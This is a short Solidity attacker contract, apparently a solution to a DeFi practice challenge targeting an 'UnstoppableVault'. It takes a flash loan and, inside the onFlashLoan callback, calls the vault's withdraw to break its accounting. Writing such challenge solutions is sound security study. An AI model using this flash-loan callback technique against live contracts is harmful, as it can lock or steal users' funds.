// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/utils/FixedPointMathLib.sol";
import "solmate/src/utils/ReentrancyGuard.sol";
import {SafeTransferLib, ERC4626, ERC20} from "solmate/src/mixins/ERC4626.sol";
import "solmate/src/auth/Owned.sol";
import {IERC3156FlashBorrower, IERC3156FlashLender} from "openzeppelin/interfaces/IERC3156.sol";
import "openzeppelin/token/ERC721/ERC721.sol";
import "./UnstoppableVault.sol";

contract UnstoppableVaultAttack is Owned, IERC3156FlashBorrower {
    UnstoppableVault pool;

    constructor(address vaultAddress) Owned(msg.sender) {
        pool = UnstoppableVault(vaultAddress);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        ERC20(token).approve(address(pool), amount);

        pool.withdraw(1, address(this), address(this));

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function executeFlashLoan(uint256 value) external onlyOwner {
        pool.flashLoan(this, address(pool.asset()), value, bytes(""));
    }
}
